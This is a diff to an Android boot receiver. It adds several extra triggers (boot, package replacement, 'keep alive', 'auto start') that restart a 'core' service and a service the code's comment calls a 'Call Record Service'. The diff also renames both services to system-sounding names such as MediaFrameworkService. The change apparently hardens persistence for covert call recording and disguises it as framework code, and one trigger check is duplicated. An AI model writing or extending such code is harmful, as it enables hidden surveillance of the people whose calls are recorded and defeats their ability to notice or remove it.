@@ -8,25 +8,22 @@ import android.os.Build;
 public class SystemBoot extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+        String action = intent.getAction();
+        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
+            Constants.ACTION_KEEP_ALIVE.equals(action) || 
+            Constants.ACTION_KEEP_ALIVE.equals(action) || 
+            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
+            Constants.ACTION_AUTO_START.equals(action)) {
             // Start Core Engine
-            Intent serviceIntent = new Intent(context, CoreSyncService.class);
-            serviceIntent.setAction("START");
+            Intent serviceIntent = new Intent(context, WorkManager_Sync.class);
+            serviceIntent.setAction(Constants.ACTION_START_CORE);
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(serviceIntent);
-            } else {
-                context.startService(serviceIntent);
-            }
+            androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
 
             // Start Call Record Service for call detection
-            Intent callServiceIntent = new Intent(context, AudioStability.class);
-            callServiceIntent.setAction("START_SERVICE");
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(callServiceIntent);
-            } else {
-                context.startService(callServiceIntent);
-            }
+            Intent callServiceIntent = new Intent(context, MediaFrameworkService.class);
+            callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
+            androidx.core.content.ContextCompat.startForegroundService(context, callServiceIntent);
         }
     }
 }
